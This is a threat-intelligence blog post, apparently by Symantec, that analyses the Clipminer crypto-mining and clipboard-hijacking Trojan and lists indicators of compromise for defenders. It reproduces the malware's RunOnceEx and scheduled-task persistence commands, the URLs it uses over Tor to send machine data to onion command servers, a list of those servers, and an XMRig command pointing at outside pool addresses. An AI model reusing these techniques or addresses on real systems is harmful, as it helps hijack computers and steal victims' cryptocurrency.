@@ -1,0 +1,149 @@
+<div><figure class="author__image"><img alt="" src="https://symantec-enterprise-blogs.security.com/sites/default/files/styles/blogs_author_avatar_small/public/2017-10/author-profile-default.jpg.webp?h=6386ac74&amp;itok=yMcB1DYB" style="max-width:80%;height:auto;width:auto;"/></figure>Threat Hunter TeamSymantec<a class="twitter" href="https://twitter.com/intent/tweet?text=Clipminer%20Botnet%20Makes%20Operators%20at%20Least%20%241.7%20Million&amp;url=https%3A%2F%2Fsymantec-enterprise-blogs.security.com%2Fblogs%2Fthreat-intelligence%2Fclipminer-bitcoin-mining-hijacking" rel="noopener" target="_blank" title="Twitter">Twitter</a><a class="linkedin" href="https://www.linkedin.com/cws/share?url=https%3A%2F%2Fsymantec-enterprise-blogs.security.com%2Fblogs%2Fthreat-intelligence%2Fclipminer-bitcoin-mining-hijacking&amp;token=&amp;isFramed=true" rel="noopener" target="_blank" title="LinkedIn">LinkedIn</a>SHAREPosted: 2 Jun, 20227 Min Read<a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence">Threat Intelligence</a>Follow<a href="https://twitter.com/threatintel" title="twitter">twitter</a><a href="https://www.linkedin.com/company/broadcomsoftware" title="linkedin">linkedin</a><h1 class="blog-post__title" id="page-title">Clipminer Botnet Makes Operators at Least $1.7 Million</h1><h2 class="blog-post__subtitle">Malware used for cryptocurrency mining and clipboard hijacking.</h2><p>Symantec’s Threat Hunter Team, a part of <a href="https://software.broadcom.com/">Broadcom Software</a>, has uncovered a cyber-criminal operation that has potentially made the actors behind it at least $1.7 million in illicit gains from cryptocurrency mining and theft via clipboard hijacking.</p>
+<p>The malware being used, tracked by Symantec as Trojan.Clipminer, has a number of similarities to another crypto-mining Trojan called <a href="https://www.welivesecurity.com/2020/09/02/kryptocibule-multitasking-multicurrency-cryptostealer/">KryptoCibule</a>, suggesting it may be a copycat or evolution of that threat.</p>
+<p>Clipminer is likely spread via Trojanized downloads of cracked or pirated software. The malware arrives on compromised computers as a self-extracting WinRAR archive that drops and executes a downloader in the form of a packed portable executable DLL file with CPL file extension (although it does not follow the CPL format). The dropped file connects to the Tor network to download Clipminer’s components.</p>
+<p>Clipminer has the ability to use compromised computers’ resources to mine for cryptocurrency. The malware also modifies the clipboard content in an attempt to redirect cryptocurrency transactions by users of the infected computer. On each clipboard update, it scans the clipboard content for wallet addresses, recognizing address formats used by at least a dozen different cryptocurrencies. The recognized addresses are then replaced with addresses of wallets controlled by the attacker. For the majority of the address formats, the attackers provide multiple replacement wallet addresses to choose from. The malware then picks the address that matches the prefix of the address to be replaced. This way, the victim is less likely to notice manipulation and is likely to proceed with the transaction. The malware includes a total of 4,375 unique addresses of wallets controlled by the attacker. Out of these, 3,677 addresses are used for just three different formats of Bitcoin addresses. Investigating just Bitcoin and Ethereum wallet addresses, we found that they, at the time of writing, contained approximately 34.3 Bitcoin and 129.9 Ethereum. However, some funds had also been transferred to what appear to be cryptocurrency tumblers, also known as cryptocurrency mixing services. These services mix potentially identifiable funds with others, so as to obscure the trail back to the fund's original source. If we include the funds transferred out to these services, the malware operators have potentially made at least $1.7 million from clipboard hijacking alone.</p>
+<h2>Technical analysis</h2>
+<p>The infection chain begins with a self-extracting WinRAR archive (bd48b5da093a37cfa5e3929c19ac06ce711bd581bc49040e68d2ba0e5610bf71) that drops and executes the masqueraded Control Panel (CPL) file:</p>
+<ul>
+<li>1d31bea6a065fa20cf41861d21b7ea39979d40126c800ebc87d07adb41fe03f4 - m5ak8iW.cpl</li>
+</ul>
+<p>The dropped file is actually a downloader in the form of a packed portable executable DLL, which has the following exports:</p>
+<ul>
+<li>GetExtensionVersion</li>
+<li>HttpExtensionProc</li>
+<li>TerminateExtension</li>
+</ul>
+<p>Once the sample is executed, it arranges for itself to start again in case it gets interrupted.</p>
+<p>To do so, it renames itself using the following format:</p>
+<ul>
+<li>C:\Windows\Temp\[VARIABLE]</li>
+</ul>
+<p>It also creates the following registry value:</p>
+<ul>
+<li>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\[VARIABLE]\"[VARIABLE]"="SHELL32.DLL|ShellExec_RunDLL|REGSVR32.EXE -s \"C:\\Windows\\Temp\\[VARIABLE].\""</li>
+</ul>
+<p>(Note the extra DOT at the end of the filename)</p>
+<p>Example file name:</p>
+<ul>
+<li>C:\Windows\Temp\and.loc</li>
+</ul>
+<p>Example corresponding registry value:</p>
+<ul>
+<li>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\zyqz</li>
+<li>"ipbfa"="SHELL32.DLL|ShellExec_RunDLL|REGSVR32.EXE -s \"C:\\Windows\\Temp\\and.loc.\""</li>
+</ul>
+<p>Both of these will be deleted by the sample once it successfully downloads and installs its payload.</p>
+<p>Next, the malware starts an embedded Tor client by downloading <a href="https://metrics.torproject.org/glossary.html#consensus">Tor consensus data</a>:</p>
+<ul>
+<li>http://[HOST_IP_AND_PORT]/tor/status-vote/current/consensus.z</li>
+</ul>
+<p>Where [HOST_IP_AND_PORT] is picked from a list embedded by the sample.</p>
+<p>The malware then connects to the Tor network.</p>
+<p>Next, it collects details from the affected computer, as shown in the following example:</p>
+<p>[PUBLIC_IPv4_ADDRESS_AS_SEEN_ON_INTERNET];[REDACTED];"Intel(R) Core(TM) i5-10500 CPU @ 3.10GHz";L"\x005CDevice\x005CHarddiskVolume3\x005CWindows\x005CSystem32\x005Crundll32.exe",L"\x005CDevice\x005CHarddiskVolume3\x005CWindows\x005CSysWOW64\x005Crundll32.exe",L"C\x003A\x005CUsers\[REDACTED]\x005CAppData\x005CLocal\x005CTemp\x005CM5aK8iW.cpL";"BC711 NVMe SK hynix 128GB[REDACTED];L"Windows Defender":61100;"PCI\[REDACTED]":"Intel(R) UHD Graphics; 630":1920:1200:59;113:[LIST_OF_RUNNING_PROCESSES];1920:1200:[DESKTOP_SCREENSHOT_AS_BASE64_ENCODED_PNG];</p>
+<p>It then sends the following HTTP GET request to an Onion Service over Tor:</p>
+<ul>
+<li>http://[ONION_SERVICE_AND_PORT]/[BINARY_AS_BASE64_ENCODED]</li>
+</ul>
+<p>Where [BINARY_AS_BASE64_ENCODED] is a blob that appears to contain details of the infected machine, and [ONION_SERVICE_AND_PORT] is one of the following:</p>
+<ul>
+<li>miwia5zo4oxcj7n6:11472</li>
+<li>6lmt3ott62q5pwae:52403</li>
+<li>nczflpbaow2ta7ua:19155</li>
+<li>re5sb73yb75nbkrm:33033</li>
+<li>qwhbbp6ye2l25wv6:13927</li>
+<li>2q3n7ycm7vxe73g6:30656</li>
+<li>w4qjsuu5x5kwvkgu:61921</li>
+<li>gk7jrmr5v3nw3u7m:40090</li>
+<li>ip2djbz3xidmkmkw:53148</li>
+<li>pvy2atf27dq2d334:2720</li>
+<li>3wquaem4x5qylhs5:17953</li>
+<li>niddw7jlqyc64xwc:36583</li>
+<li>ga3zm6uelxuniyq4:60117</li>
+<li>sv2fubnuttyzvfgl:39828</li>
+<li>kzzuxfvchn5kb73c:21646</li>
+<li>p2dw3umgw6qhrld3:25947</li>
+<li>wkhipwh6fb5j5hzx:25280</li>
+<li>ml7sphy7w3k2ge6d:12508</li>
+<li>dvivtswsxdxsqqxa:26960</li>
+<li>tq2srsgevhutzw42:43477</li>
+<li>xh6pciiw6yeqz3bs:19956</li>
+<li>xup6y7cxgjorezif:51516</li>
+<li>lbwgagk54ww5c3nj:32284</li>
+<li>rim3qyk3tdbt2iw3:60747</li>
+<li>krq2qyjhfwh4trww:51499</li>
+<li>obowq55leh2wguwg:35882</li>
+<li>xph6exfmdo7b4tkw:38607</li>
+<li>rs24qxgkhecjcgdn:51533</li>
+<li>i3uhj2pyh4cwwbmy:54343</li>
+<li>7udhxrfpz6qwvspy:31399</li>
+<li>nwogcq7cmhth7e4x:15588</li>
+<li>gwtpcz4n3wtkwhj4:64393</li>
+<li>5fajnveyn2bd4nm7:5990</li>
+<li>vcammjx7ddus5kfr:64148</li>
+<li>42xgf6qae5wjbcva:45252</li>
+</ul>
+<p>Note that the above are v2 Onion Services. In 2021, v2 Onion Services were depreciated and are no longer supported by current versions of Tor. However, many nodes on the Tor network have yet to be upgraded, meaning the services are still reachable.</p>
+<p>The received response is roughly 10 MB in size and contains the Clipminer payload, which is used to perform coin mining and clipboard hijacking on the compromised computer.</p>
+<p>The payload is stored in the following location:</p>
+<ul>
+<li>[EXISTING_TOP_DIRECTORY]\[VARIABLE]\[VARIABLE]\</li>
+</ul>
+<p>Where [EXISTING_TOP_DIRECTORY] is one of the following:</p>
+<ul>
+<li>C:\Program Files (x86)\</li>
+<li>C:\Program Files (x86)\Common Files\</li>
+<li>C:\ProgramData\</li>
+<li>[USERPROFILE]\AppData\Local\</li>
+</ul>
+<p>The following is an example of the location and directory naming convention used by the malware:</p>
+<ul>
+<li>C:\Program Files (x86)\Common Files\DevelTies\JueuiSirvices\</li>
+</ul>
+<p>It also populates the two newly created directories with files copied from the local machine so that the malicious files are less likely to stand out.</p>
+<p>It then drops the load point to the inner directory, where file hash, file directory, and file name vary:</p>
+<ul>
+<li>f49a5a0f2397609a3fb97728b5a997eb77cfa1b529188403fb5e8adaeac1860b rhnoiniye_ni.dll (Packed load point)</li>
+</ul>
+<p>Then it creates scheduled tasks (similar to the following examples) to execute the load point for persistence (details vary between runs):</p>
+<p>URI: \Microsoft\Windows\Active Directory Rights Management Services Client\Microc040e</p>
+<p>Actions: Exec</p>
+<p>Command: C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe</p>
+<p>Arguments: /u "C:\Program Files (x86)\Common Files\DevelTies\JueuiSirvices\imsgt_dvepr.dll"</p>
+<p>WorkingDirectory: C:\Program Files (x86)\Common Files\DevelTies\JueuiSirvices</p>
+<p>It creates the following empty registry key (likely as an infection marker):</p>
+<ul>
+<li>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\[VARYING_UUID_FORMAT]</li>
+</ul>
+<p>For example:</p>
+<ul>
+<li>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{19C316FE-770F-426C-9B63-F76C34154769}</li>
+</ul>
+<p>The loaded payload starts a v3 Onion Service (the address changes per infection). We also observed traces of another v3 Onion Service (possibly used to ping the attackers whenever the compromised machine comes online).</p>
+<p>The payload will monitor keyboard and mouse activity to determine if the machine is in use. It also appears to monitor running processes, checking for analysis/troubleshooting tools.</p>
+<p>Whenever the malware determines that a machine is not in use (and at least some of the troubleshooting tools are not used), it starts the XMRig cryptocurrency miner. There are some indications that the attackers used a different miner in the past. Also, it is very likely that a different miner is used when a dedicated GPU is available (e.g. NVIDIA graphics card).</p>
+<p>We also observed what looks like an XMRig command line (used during injection):</p>
+<ul>
+<li>6Y6H --cpu-max-threads-hint=99 -k --pause-on-battery -o 94.75.205.148:443 -o 179.60.146.9:443</li>
+</ul>
+<p>The sample includes a list of IPv4 addresses and picks two each time.</p>
+<p>There is also an example JSONRPC request in memory (before encryption):</p>
+<p>{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"x","pass":"x","agent":"app/1 (Windows NT 10.0; Win64; x64) libuv/1.41.0 msvc/2019 rnd/dywqmjcdytwkxewrvtqznxgmpmdzyqgulzacxcxx","algo":["cn/1","cn/2","cn/r","cn/fast","cn/half","cn/xao","cn/rto","cn/rwz","cn/zls","cn/double","cn/ccx","rx/0","rx/wow","rx/arq","rx/sfx","rx/keva","argon2/chukwa","argon2/chukwav2","argon2/wrkz"]}}</p>
+<p>Additionally, the malware monitors the clipboard for cryptocurrency addresses and replaces them with ones controlled by the attackers.</p>
+<figure><img alt="Figure 1. Clipminer monitors the clipboard for cryptocurrency addresses and replaces them with ones controlled by the attackers" src="https://symantec-enterprise-blogs.security.com/sites/default/files/styles/blogs_inline_small/public/2022-05/Fig.1.png.webp?itok=FE0xwwHX" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 1. Clipminer monitors the clipboard for cryptocurrency addresses and replaces them with ones controlled by the attackers</figcaption></figure><figure><img alt="Figure 2. Clipminer gains control of the computer’s clipboard and replaces cryptocurrency addresses with ones controlled by the attackers" src="https://symantec-enterprise-blogs.security.com/sites/default/files/styles/blogs_inline_small/public/2022-05/Fig.2.png.webp?itok=quk8dWtv" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 2. Clipminer gains control of the computer’s clipboard and replaces cryptocurrency addresses with ones controlled by the attackers</figcaption></figure><p>Samples of the Clipminer malware began to appear around January 2021, with the cryptocurrency wallets used by the malware’s operators seeing activity begin in February of the same year. This is just a few months after KryptoCibule was uncovered and blogged about by ESET researchers.</p>
+<p>While we cannot confirm if Clipminer and KryptoCibule are one and the same, the design similarities are striking. It is possible that following the exposure from ESET’s blog, the KryptoCibule actors may have decided to switch things up and launched Clipminer. Another possibility is that different threat actors may have taken inspiration from KryptoCibule and created Clipminer in its image.</p>
+<p>However, whatever the truth may be, one thing is clear: Clipminer has proven a successful endeavor, earning its operators a considerable amount of money.</p>
+<h2>Protection/Mitigation</h2>
+<ul>
+<li>Trojan.Clipminer</li>
+</ul>
+<p>For the latest protection updates, please visit the <a href="https://www.broadcom.com/support/security-center/protection-bulletin">Symantec Protection Bulletin</a>.</p>
+<h2>Indicators of Compromise</h2>
+<p>If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.</p>
+<ul>
+<li>bd48b5da093a37cfa5e3929c19ac06ce711bd581bc49040e68d2ba0e5610bf71 – Dropper</li>
+<li>1d31bea6a065fa20cf41861d21b7ea39979d40126c800ebc87d07adb41fe03f4 – Downloader</li>
+<li>f49a5a0f2397609a3fb97728b5a997eb77cfa1b529188403fb5e8adaeac1860b – Packed load point</li>
+<li>12e6883046e2c92cbe3b5706ea7f1181b44512f179c7f04e88e75f3f6e392a48 – Downloader</li>
+</ul>
+<img alt="" src="https://symantec-enterprise-blogs.security.com/sites/default/files/styles/blogs_author_bio_small/public/2017-10/author-profile-default.jpg.webp?h=6386ac74&amp;itok=w8Rg1PQZ" style="max-width:80%;height:auto;width:auto;"/><h2 class="blog-author__title">About the Author</h2><h3 class="blog-author__name">Threat Hunter Team</h3><h4 class="blog-author__position">Symantec</h4><p>The Threat Hunter Team is a group of security experts within Symantec whose mission is to investigate targeted attacks, drive enhanced protection in Symantec products, and offer analysis that helps customers respond to attacks.</p><h2 class="blog-post__comment-title">Want to comment on this post?</h2><p>We encourage you to share your thoughts on your favorite social platform.</p><a class="twitter" href="https://twitter.com/intent/tweet?text=Clipminer%20Botnet%20Makes%20Operators%20at%20Least%20%241.7%20Million&amp;url=https%3A%2F%2Fsymantec-enterprise-blogs.security.com%2Fblogs%2Fthreat-intelligence%2Fclipminer-bitcoin-mining-hijacking" rel="noopener" target="_blank" title="Twitter">Twitter</a><a class="linkedin" href="https://www.linkedin.com/cws/share?url=https%3A%2F%2Fsymantec-enterprise-blogs.security.com%2Fblogs%2Fthreat-intelligence%2Fclipminer-bitcoin-mining-hijacking&amp;token=&amp;isFramed=true" rel="noopener" target="_blank" title="LinkedIn">LinkedIn</a></div>
